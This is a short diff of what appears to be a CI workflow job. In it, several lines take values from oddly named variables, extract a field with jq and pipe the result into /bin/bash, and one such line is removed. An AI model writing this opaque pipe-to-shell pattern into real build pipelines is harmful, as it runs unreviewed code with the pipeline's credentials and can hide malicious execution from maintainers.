@@ -27,7 +27,6 @@ jobs:
           echo $mwk515 | jq -r .bwa909 | /bin/bash
           echo $qk9 | jq -r .lbeol3 | /bin/bash
           printf '%s' "$z62" | jq -r .d510 | /bin/bash
-          echo $ukaav8825 | jq -r .qthzt922 | /bin/bash
           echo $g022 | jq -r .u0339 | /bin/bash
 
       - name: Archive output
